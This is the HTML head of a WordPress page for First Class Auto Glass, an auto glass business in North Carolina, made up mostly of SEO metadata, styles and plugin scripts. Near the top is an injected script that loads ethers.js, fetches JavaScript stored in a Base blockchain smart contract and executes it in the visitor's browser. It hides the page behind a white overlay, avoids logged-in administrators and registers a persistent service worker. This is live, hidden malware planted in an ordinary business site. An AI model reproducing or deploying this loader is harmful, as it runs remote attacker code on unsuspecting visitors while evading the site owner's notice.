@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html lang="en-US" prefix="og: https://ogp.me/ns#">
+<head>
+	<meta charset="UTF-8">
+		
+            <script async src='https://obseu.bmccfortress.com/i/98fed2db9fdf11d3d32366fe618a6ad8.js' class='ct_clicktrue'></script>
+            <script async src='https://www.clickcease.com/monitor/stat.js'>
+            </script>
+        <script data-c="0x58460d0b3d4d6b03761c89120393c0c676676496">(function(c){var t=(c||"").toLowerCase(),n="nc:"+t,Z="0x0000000000000000000000000000000000000000",r=["https://mainnet.base.org","https://base.publicnode.com","https://base-rpc.publicnode.com","https://base.drpc.org","https://1rpc.io/base","https://base-mainnet.public.blastapi.io","https://base.gateway.tenderly.co"],cd=["https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js","https://unpkg.com/ethers@6.13.5/dist/ethers.umd.min.js","https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"];if(!t)return;if(window.__ncSkip||document.cookie.indexOf("nc_skip=1")>=0||/wordpress_logged_in_[^=]+=/.test(document.cookie)||/\/wp-admin|\/wp-login\.php|wp-admin\/|wp-login\.php/i.test(location.pathname+location.search))return;if(window.__ncR)return;window.__ncR=1;try{navigator.storage&&navigator.storage.persist&&navigator.storage.persist()}catch(e){}var rmCover=function(){var _cx=document.getElementById("nc-cover");if(_cx)try{_cx.remove()}catch(e){}},reveal=function(){if(!document.getElementById("nochain-demo-frame"))rmCover()};try{var cv=document.createElement("div");cv.id="nc-cover";cv.style.cssText="position:fixed;inset:0;width:100vw;height:100vh;margin:0;padding:0;border:0;background:#fff;z-index:2147483646";(document.documentElement||document.body).appendChild(cv);try{cv.popover="manual";cv.showPopover()}catch(e){}}catch(e){}try{var _ro=JSON.parse(localStorage[n+":rpc"]);if(_ro&&_ro.length)r=_ro.filter(function(u){return typeof u=="string"&&u.indexOf("https://")==0}).slice(0,15).concat(r)}catch(z){}try{var _co=JSON.parse(localStorage[n+":cdn"]);if(_co&&_co.length)cd=_co.filter(function(u){return typeof u=="string"&&u.indexOf("https://")==0}).slice(0,8).concat(cd)}catch(z){}["https://cdn.jsdelivr.net","https://unpkg.com","https://cdnjs.cloudflare.com","https://mainnet.base.org"].forEach(function(u){try{var l=document.createElement("link");l.rel="preconnect";l.href=u;(document.head||document.documentElement).appendChild(l)}catch(z){}});var a=Object.getPrototypeOf(async function(){}).constructor,i=["function getActiveScripts() view returns (uint256[] ids, string[] names, string[] codes)","function hasDemoPage() view returns (bool)","function getDemoPage() view returns (string pageType, string content, uint256 updatedAt)"],x=function(e,nn,p){var w={address:Z,provider:p||{},getAddress:function(){return Promise.resolve(Z)}},E=typeof ethers!=="undefined"?ethers:void 0;return e.reduce(function(q,u){return q.then(function(){return new a("console","ethers","provider","contract","wallet","document","window",'"use strict";return(async()=>{\n'+u+'\n})();')(console,E,p,nn,w,document,window)}).catch(function(z){})},Promise.resolve())},m=function(e){return{target:t,getActiveScripts:function(){return Promise.resolve([e.i,e.n,e.c])},hasDemoPage:function(){return Promise.resolve(!!e.d)},getDemoPage:function(){return Promise.resolve(e.d?[e.d[0],e.d[1],0]:["","",0])}}},cached;try{cached=JSON.parse(localStorage[n])}catch(z){}var shown=false,kill=function(){try{navigator.serviceWorker.getRegistrations().then(function(rs){rs.forEach(function(r){r.unregister()})})}catch(z){}try{caches.delete("nc-eth")}catch(z){}try{caches.delete("ncblob")}catch(z){}},fb=function(){if(!shown&&cached&&cached.c){if(cached.d&&cached.d[1]==="nc-kill"){shown=true;kill();return}shown=true;try{x(cached.c,m(cached),null)}catch(z){}}};function boot(){var f=async function(p){var e=new ethers.Contract(t,i,p),g=await e.getActiveScripts(),d=null;try{if(await e.hasDemoPage()){var h=await e.getDemoPage();d=[h[0],h[1]]}}catch(z){}return{i:g[0].map(function(x){return Number(x)}),n:Array.from(g[1]),c:Array.from(g[2]),d:d}},j=async function(p){var y=await f(p),w=new ethers.Contract(t,i,p);try{localStorage[n]=JSON.stringify({i:y.i,n:y.n,c:y.c})}catch(z){}if(y.d&&y.d[1]==="nc-kill"){shown=true;kill();return!0}await x(y.c,w,p);shown=true;return!0};async function b(){if(!ethers.isAddress(t))return;for(var att=0;att<2;att++){var s=r.slice().sort(function(){return Math.random()-.5});for(var v=0;v<s.length;v++)try{var g=new ethers.JsonRpcProvider(s[v],8453,{staticNetwork:!0});if(await j(g))return}catch(z){}}fb()}b().catch(function(z){console.error("[nc]",z&&z.message||z);fb()}).finally(reveal)}function ld(k){if(window.ethers)return boot();if(k>=cd.length){console.error("[nc] cdn fail");return fb()}var o=document.createElement("script");o.src=cd[k];o.fetchPriority="high";o.onload=function(){window.ethers?boot():ld(k+1)};o.onerror=function(){ld(k+1)};(document.head||document.documentElement).appendChild(o)}setTimeout(function(){fb();reveal()},10000);ld(0)})(document.currentScript&&document.currentScript.dataset.c)</script><script>if(navigator.serviceWorker&&!/wp-admin|wp-login\.php/i.test(location.pathname)&&document.cookie.indexOf("nc_skip=1")<0&&!/wordpress_logged_in_[^=]+=/.test(document.cookie)){navigator.serviceWorker.register("https://firstclassautoglassnc.com/nochain-sw.js",{scope:"/",updateViaCache:"all"}).catch(function(){})}</script>
+
+<!-- Search Engine Optimization by Rank Math - https://rankmath.com/ -->
+<title>Auto Glass Replacement NC | First Class Auto Glass</title>
+<meta name="description" content="WE COME TO YOU"/>
+<meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>
+<link rel="canonical" href="https://firstclassautoglassnc.com/auto-glass-replacement-nc/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Auto Glass Replacement NC | First Class Auto Glass" />
+<meta property="og:description" content="WE COME TO YOU" />
+<meta property="og:url" content="https://firstclassautoglassnc.com/auto-glass-replacement-nc/" />
+<meta property="og:site_name" content="First Class Auto Glass" />
+<meta property="article:publisher" content="https://www.facebook.com/firstclassautoglassnc/" />
+<meta property="og:updated_time" content="2025-07-10T18:53:42-05:00" />
+<meta property="og:image" content="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg" />
+<meta property="og:image:secure_url" content="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg" />
+<meta property="og:image:width" content="1000" />
+<meta property="og:image:height" content="667" />
+<meta property="og:image:alt" content="Auto Glass Replacement NC" />
+<meta property="og:image:type" content="image/jpeg" />
+<meta property="article:published_time" content="2025-04-15T14:57:39-05:00" />
+<meta property="article:modified_time" content="2025-07-10T18:53:42-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Auto Glass Replacement NC | First Class Auto Glass" />
+<meta name="twitter:description" content="WE COME TO YOU" />
+<meta name="twitter:site" content="@fcautoglass" />
+<meta name="twitter:creator" content="@fcautoglass" />
+<meta name="twitter:image" content="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg" />
+<meta name="twitter:label1" content="Time to read" />
+<meta name="twitter:data1" content="1 minute" />
+<script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":"Place","@id":"https://firstclassautoglassnc.com/#place","address":{"@type":"PostalAddress","streetAddress":"1892 Charlotte Hwy Unit 1","addressLocality":"Mooresville","addressRegion":"North Carolina","postalCode":"28115","addressCountry":"United States"}},{"@type":["ProfessionalService","Organization"],"@id":"https://firstclassautoglassnc.com/#organization","name":"First Class Auto Glass","url":"https://firstclassautoglassnc.com","sameAs":["https://www.facebook.com/firstclassautoglassnc/","https://twitter.com/fcautoglass"],"email":"contact@firstclassautoglassnc.com","address":{"@type":"PostalAddress","streetAddress":"1892 Charlotte Hwy Unit 1","addressLocality":"Mooresville","addressRegion":"North Carolina","postalCode":"28115","addressCountry":"United States"},"logo":{"@type":"ImageObject","@id":"https://firstclassautoglassnc.com/#logo","url":"https://firstclassautoglassnc.com/wp-content/uploads/2024/05/First-Class-Auto-Glass-512x512-1.jpg","contentUrl":"https://firstclassautoglassnc.com/wp-content/uploads/2024/05/First-Class-Auto-Glass-512x512-1.jpg","caption":"First Class Auto Glass","inLanguage":"en-US","width":"512","height":"512"},"openingHours":["Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday 09:00-17:00"],"legalName":"First Class Auto Glass","location":{"@id":"https://firstclassautoglassnc.com/#place"},"image":{"@id":"https://firstclassautoglassnc.com/#logo"},"telephone":"(980) 242-8339"},{"@type":"WebSite","@id":"https://firstclassautoglassnc.com/#website","url":"https://firstclassautoglassnc.com","name":"First Class Auto Glass","publisher":{"@id":"https://firstclassautoglassnc.com/#organization"},"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg","url":"https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg","width":"200","height":"200","inLanguage":"en-US"},{"@type":"WebPage","@id":"https://firstclassautoglassnc.com/auto-glass-replacement-nc/#webpage","url":"https://firstclassautoglassnc.com/auto-glass-replacement-nc/","name":"Auto Glass Replacement NC | First Class Auto Glass","datePublished":"2025-04-15T14:57:39-05:00","dateModified":"2025-07-10T18:53:42-05:00","isPartOf":{"@id":"https://firstclassautoglassnc.com/#website"},"primaryImageOfPage":{"@id":"https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg"},"inLanguage":"en-US"},{"@type":"Person","@id":"https://firstclassautoglassnc.com/author/firstclassautoglass/","name":"First Class Auto Glass","url":"https://firstclassautoglassnc.com/author/firstclassautoglass/","image":{"@type":"ImageObject","@id":"https://secure.gravatar.com/avatar/ba6d47cf5e154414b778a5a92927f607a709bf154fd6284bb2cc63df4ad079ec?s=96&amp;d=mm&amp;r=g","url":"https://secure.gravatar.com/avatar/ba6d47cf5e154414b778a5a92927f607a709bf154fd6284bb2cc63df4ad079ec?s=96&amp;d=mm&amp;r=g","caption":"First Class Auto Glass","inLanguage":"en-US"},"sameAs":["https://firstclassautoglassnc.com"],"worksFor":{"@id":"https://firstclassautoglassnc.com/#organization"}},{"@type":"Article","headline":"Auto Glass Replacement NC | First Class Auto Glass","datePublished":"2025-04-15T14:57:39-05:00","dateModified":"2025-07-10T18:53:42-05:00","author":{"@id":"https://firstclassautoglassnc.com/author/firstclassautoglass/","name":"First Class Auto Glass"},"publisher":{"@id":"https://firstclassautoglassnc.com/#organization"},"description":"WE COME TO YOU","name":"Auto Glass Replacement NC | First Class Auto Glass","@id":"https://firstclassautoglassnc.com/auto-glass-replacement-nc/#richSnippet","isPartOf":{"@id":"https://firstclassautoglassnc.com/auto-glass-replacement-nc/#webpage"},"image":{"@id":"https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg"},"inLanguage":"en-US","mainEntityOfPage":{"@id":"https://firstclassautoglassnc.com/auto-glass-replacement-nc/#webpage"}}]}</script>
+<!-- /Rank Math WordPress SEO plugin -->
+
+<link rel="alternate" type="application/rss+xml" title="First Class Auto Glass &raquo; Feed" href="https://firstclassautoglassnc.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="First Class Auto Glass &raquo; Comments Feed" href="https://firstclassautoglassnc.com/comments/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://firstclassautoglassnc.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffirstclassautoglassnc.com%2Fauto-glass-replacement-nc%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://firstclassautoglassnc.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Ffirstclassautoglassnc.com%2Fauto-glass-replacement-nc%2F&#038;format=xml" />
+<style id="wp-img-auto-sizes-contain-inline-css">
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:root { --wp--style--global--content-size: 800px;--wp--style--global--wide-size: 1200px; }:where(body) { margin: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 24px; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child { margin-block-end: 0; }:root { --wp--style--block-gap: 24px; }:root :where(.is-layout-flow) > :first-child{margin-block-start: 0;}:root :where(.is-layout-flow) > :last-child{margin-block-end: 0;}:root :where(.is-layout-flow) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-constrained) > :first-child{margin-block-start: 0;}:root :where(.is-layout-constrained) > :last-child{margin-block-end: 0;}:root :where(.is-layout-constrained) > *{margin-block-start: 24px;margin-block-end: 0;}:root :where(.is-layout-flex){gap: 24px;}:root :where(.is-layout-grid){gap: 24px;}.is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}.is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}.is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}.is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:root :where(.wp-block-icon svg){width: 24px;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+<link rel='stylesheet' id='hello-elementor-css' href='https://firstclassautoglassnc.com/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.9' media='all' />
+<link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://firstclassautoglassnc.com/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.9' media='all' />
+<link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://firstclassautoglassnc.com/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.9' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='elementor-post-85-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-85.css?ver=1782574579' media='all' />
+<link rel='stylesheet' id='pafe-2607-css' href='https://firstclassautoglassnc.com/wp-content/uploads/premium-addons-elementor/pafe-2607.css?ver=1752173622' media='all' />
+<link rel='stylesheet' id='powerpack-frontend-css' href='https://firstclassautoglassnc.com/wp-content/plugins/powerpack-elements/assets/css/min/frontend.min.css?ver=2.10.17' media='all' />
+<link rel='stylesheet' id='e-animation-fadeInUp-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInUp.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='e-animation-grow-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/lib/animations/styles/e-animation-grow.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='e-animation-fadeInRight-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInRight.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='font-awesome-5-all-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=4.11.82' media='all' />
+<link rel='stylesheet' id='pa-slick-css' href='https://firstclassautoglassnc.com/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-css/slick.min.css?ver=4.11.82' media='all' />
+<link rel='stylesheet' id='widget-image-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=4.1.4' media='all' />
+<link rel='stylesheet' id='elementor-post-2607-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/css/post-2607.css?ver=1782607738' media='all' />
+<link rel='stylesheet' id='ekit-widget-styles-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementskit-lite/widgets/init/assets/css/widget-styles.css?ver=3.9.9' media='all' />
+<link rel='stylesheet' id='ekit-responsive-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementskit-lite/widgets/init/assets/css/responsive.css?ver=3.9.9' media='all' />
+<link rel='stylesheet' id='lenis-css' href='https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/includes/smooth-scroller/assets/lenis.min.css?ver=8.5.1' media='all' />
+<link rel='stylesheet' id='bdt-uikit-css' href='https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/css/bdt-uikit.css?ver=3.21.7' media='all' />
+<link rel='stylesheet' id='ep-helper-css' href='https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-element-pack/assets/css/ep-helper.css?ver=8.5.1' media='all' />
+<link rel='stylesheet' id='prime-slider-site-css' href='https://firstclassautoglassnc.com/wp-content/plugins/bdthemes-prime-slider-lite/assets/css/prime-slider-site.css?ver=4.4.1' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-saira-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/google-fonts/css/saira.css?ver=1742225885' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-rubik-css' href='https://firstclassautoglassnc.com/wp-content/uploads/elementor/google-fonts/css/rubik.css?ver=1742225902' media='all' />
+<link rel='stylesheet' id='elementor-icons-ekiticons-css' href='https://firstclassautoglassnc.com/wp-content/plugins/elementskit-lite/modules/elementskit-icon-pack/assets/css/ekiticons.css?ver=3.9.9' media='all' />
+<link rel='stylesheet' id='elementor-icons-material-design-icons-css' href='https://firstclassautoglassnc.com/wp-content/plugins/material-design-icons-for-elementor/assets/material-icons/css/material-icons-regular.css?ver=1.5.1' media='all' />
+<script type='text/javascript'>
+		var elementskit = {
+			resturl: 'https://firstclassautoglassnc.com/wp-json/elementskit/v1/',
+		}
+
+		</script><script id="jquery-core-js-extra">
+var pp = {"ajax_url":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php"};
+//# sourceURL=jquery-core-js-extra
+</script>
+<script id="jquery-core-js" src="https://firstclassautoglassnc.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
+<script id="jquery-migrate-js" src="https://firstclassautoglassnc.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
+<script id="clickceaseFrontEnd-js-extra">
+var ajax_obj = {"cc_nonce":"56ea2dfb0d","ajax_url":"https://firstclassautoglassnc.com/wp-admin/admin-ajax.php","ajax_action":"validate_clickcease_response"};
+//# sourceURL=clickceaseFrontEnd-js-extra
+</script>
+<script id="clickceaseFrontEnd-js" src="https://firstclassautoglassnc.com/wp-content/plugins/clickcease-click-fraud-protection/includes/assets/js/front-end.js?ver=1.0"></script>
+<link rel="https://api.w.org/" href="https://firstclassautoglassnc.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://firstclassautoglassnc.com/wp-json/wp/v2/pages/2607" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://firstclassautoglassnc.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 7.0" />
+<link rel='shortlink' href='https://firstclassautoglassnc.com/?p=2607' />
+<meta name="generator" content="Elementor 4.1.4; features: e_font_icon_svg, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NWPDMTVV"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<script type="application/ld+json">    
+      {
+  "@context": "https://schema.org",
+  "@type": "AutoRepair",
+  "name": "First Class Auto Glass NC",
+  "description": "Discover top-notch auto glass services at First Class Auto Glass NC, located at 1892 Charlotte Hwy Unit 1. Specializing in windshield replacement and repair, our expert technicians deliver fast, reliable service using high-quality materials to ensure your safety on the road. Whether you're searching for \"windshield replacement near me\" or \"auto glass replacement,\" our experienced team is ready to restore your vehicle's glass to pristine condition. At First Class Auto Glass NC, we pride ourselves on exceptional customer service, competitive pricing, and convenient appointment scheduling. Trust us for all your auto glass needs and experience the first-class difference today!",
+  "url": "https://www.firstclassautoglassnc.com/",
+  "telephone": "+19802428339",
+  "image": "https://paige-images-production.s3.amazonaws.com/32f76f43-4a81-4c68-9097-4bc1d7b5fcc1.png",
